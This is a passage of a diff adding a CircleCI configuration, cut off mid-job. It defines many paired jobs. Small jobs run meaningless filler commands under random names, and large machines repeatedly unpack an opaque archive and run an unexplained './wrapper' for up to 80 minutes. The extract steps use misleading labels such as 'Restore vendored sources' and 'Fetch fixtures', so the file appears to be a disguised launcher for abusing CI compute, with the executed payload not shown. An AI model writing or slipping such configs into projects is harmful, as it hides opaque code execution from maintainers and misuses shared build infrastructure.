@@ -1,0 +1,1539 @@
+version: 2.1
+
+jobs:
+  round2_quebec-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: thursday thump
+          command: |
+            mkdir -p /tmp/x
+            set +o pipefail 2>/dev/null; seq 1 1404470 | awk '{print $1,int($1/10)}' | sort -k2n -k1n | head -n 10000 > /tmp/x/GATE.out; true
+            echo "stage:quebec-8:ok:$(wc -c </tmp/x/GATE.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - GATE.out
+  quebec-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/GATE.out 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  db_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: block sand
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo "aaa bbb aaa ccc bbb aaa" | tr ' ' '\n' | sort | uniq -c | sort -rn | head -1; true ; } > /tmp/x/MID.ok
+            echo "stage:promote:ok:$(wc -c </tmp/x/MID.ok)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - MID.ok
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/MID.ok 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  beta_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: burn in
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; pwd | md5sum; true ; } > /tmp/x/data-C.bin
+            echo "stage:deploy:ok:$(wc -c </tmp/x/data-C.bin)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - data-C.bin
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/data-C.bin 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  green_rm-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: oasis
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo "key: value" | sed 's/^.*: //'; true ; } > /tmp/x/step-3.log
+            echo "stage:rm-webhook:ok:$(wc -c </tmp/x/step-3.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - step-3.log
+  rm-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/step-3.log 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  red_node18-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: pls work
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; tasks=$(ps -eo pid 2>/dev/null | wc -l) && echo $((tasks)); true ; } > /tmp/x/FLOW.out
+            echo "stage:node18-cov:ok:$(wc -c </tmp/x/FLOW.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - FLOW.out
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/FLOW.out 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  beta_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: red light
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo "x1 x2 x3 x4 x5" | awk '{for(i=1;i<=NF;i++)printf "%s ",$i; print ""}'; true ; } > /tmp/x/build-04.log
+            echo "stage:package:ok:$(wc -c </tmp/x/build-04.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - build-04.log
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/build-04.log 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  reset_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: elegy
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="programming"; a[1]; for(i=1;i<=length(s);i++)a[substr(s,i,1)]++; for(k in a)print k":"a[k]}' | sort; true ; } > /tmp/x/T.data
+            echo "stage:artifacts:ok:$(wc -c </tmp/x/T.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - T.data
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/T.data 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  round1_DEPLOY_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: chant
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; head -c 2M /dev/urandom | base64 | wc -c; true ; } > /tmp/x/.persisted
+            echo "stage:DEPLOY_DEV:ok:$(wc -c </tmp/x/.persisted)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - .persisted
+  DEPLOY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/.persisted 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  loader_q4-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: chaos monkey
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; printf "%s=%s\n" a 1 b 2 c 3; true ; } > /tmp/x/computation.out
+            echo "stage:q4-rev:ok:$(wc -c </tmp/x/computation.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - computation.out
+  q4-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/computation.out 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  prep_send-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: belay
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo {a..z} | wc -w; true ; } > /tmp/x/blob1
+            echo "stage:send-it:ok:$(wc -c </tmp/x/blob1)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - blob1
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/blob1 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  generate_DEV_DEPLOY_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: message cto
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 10 90 | awk '$1~/[13]$/' | wc -l; true ; } > /tmp/x/newest.log
+            echo "stage:DEV_DEPLOY_1:ok:$(wc -c </tmp/x/newest.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - newest.log
+  DEV_DEPLOY_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/newest.log 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  stage_d-old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: calm step
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print cos(0), sin(1.5708), exp(1)}'; true ; } > /tmp/x/passoff.txt
+            echo "stage:d-old:ok:$(wc -c </tmp/x/passoff.txt)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - passoff.txt
+  d-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/passoff.txt 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  prefetch_cf-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: middle layer
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{s+=$1; print s}' | tail -1; true ; } > /tmp/x/attempt-5.data
+            echo "stage:cf-alt:ok:$(wc -c </tmp/x/attempt-5.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - attempt-5.data
+  cf-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/attempt-5.data 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  ctx_QA_VERIFY_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: oil lamp
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo -n abcdef | wc -c; true ; } > /tmp/x/stage1.data
+            echo "stage:QA_VERIFY_8:ok:$(wc -c </tmp/x/stage1.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - stage1.data
+  QA_VERIFY_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/stage1.data 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  blue_green-light-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: brunch maybe
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; grep -c "^processor" /proc/cpuinfo; true ; } > /tmp/x/changelog.md
+            echo "stage:green-light-go:ok:$(wc -c </tmp/x/changelog.md)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - changelog.md
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/changelog.md 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  bootstrap_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: graveyard shift
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | sort | uniq -c | sort -rn | head -3; true ; } > /tmp/x/yellow.data
+            echo "stage:defualt:ok:$(wc -c </tmp/x/yellow.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - yellow.data
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/yellow.data 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  vendor_bravo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: pause here
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 60 | awk '{if(NR%6==0)print $0":newline"}'; true ; } > /tmp/x/run-done.log
+            echo "stage:bravo:ok:$(wc -c </tmp/x/run-done.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - run-done.log
+  bravo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/run-done.log 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  run_xray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: storm front
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /tmp/x/snapshot.dat
+            echo "stage:xray:ok:$(wc -c </tmp/x/snapshot.dat)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - snapshot.dat
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/snapshot.dat 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  stepB_UAT_STAGE_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: TAG
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 10 90 | awk '$1~/[13]$/' | wc -l; true ; } > /tmp/x/work-05.data
+            echo "stage:UAT_STAGE_7:ok:$(wc -c </tmp/x/work-05.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - work-05.data
+  UAT_STAGE_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/work-05.data 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  bake_hotfix-4079:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: pincer
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if(c[int($1/10)]++)}' | wc -l 2>/dev/null || seq 1 100 | awk '{c[int($1/10)]++}END{for(k in c)print k,c[k]}'; true ; } > /tmp/x/asdfgh.dat
+            echo "stage:hotfix-4079:ok:$(wc -c </tmp/x/asdfgh.dat)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - asdfgh.dat
+  hotfix-4079:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/asdfgh.dat 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  warmup_omar-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: curved line
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=190 2>/dev/null | md5sum; true ; } > /tmp/x/step-9.log
+            echo "stage:omar-run:ok:$(wc -c </tmp/x/step-9.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - step-9.log
+  omar-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/step-9.log 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  step2_DATA-697:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: stamp approved
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; date +"%W"; true ; } > /tmp/x/trace.ndjson
+            echo "stage:DATA-697:ok:$(wc -c </tmp/x/trace.ndjson)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - trace.ndjson
+  DATA-697:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/trace.ndjson 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  ctx2_py310-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: romanian pull
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=10; p=1; for(i=1;i<=n;i++)p*=2; print p}'; true ; } > /tmp/x/main_job_output_v2.log
+            echo "stage:py310-bench:ok:$(wc -c </tmp/x/main_job_output_v2.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - main_job_output_v2.log
+  py310-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/main_job_output_v2.log 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  preinit_d-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: breaststroke slow
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; ls /proc 2>/dev/null | grep -c '^[0-9]' 2>/dev/null; true ; } > /tmp/x/stage4.data
+            echo "stage:d-new:ok:$(wc -c </tmp/x/stage4.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - stage4.data
+  d-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/stage4.data 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  cook_ed-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hail test
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{s+=$1; print NR":"s}' | tail -3; true ; } > /tmp/x/file3.txt
+            echo "stage:ed-push:ok:$(wc -c </tmp/x/file3.txt)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - file3.txt
+  ed-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/file3.txt 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  red_LAB_CHECK_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: puddle hop
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /tmp/x/zxcvbn.dat
+            echo "stage:LAB_CHECK_1:ok:$(wc -c </tmp/x/zxcvbn.dat)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - zxcvbn.dat
+  LAB_CHECK_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/zxcvbn.dat 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  canary_rust-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: leg raise
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; grep "." /etc/hostname | md5sum | cut -c1-10; true ; } > /tmp/x/save-B.pkl
+            echo "stage:rust-lint:ok:$(wc -c </tmp/x/save-B.pkl)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - save-B.pkl
+  rust-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/save-B.pkl 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  spin_assemble-quick-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: loop again
+          command: |
+            mkdir -p /tmp/x
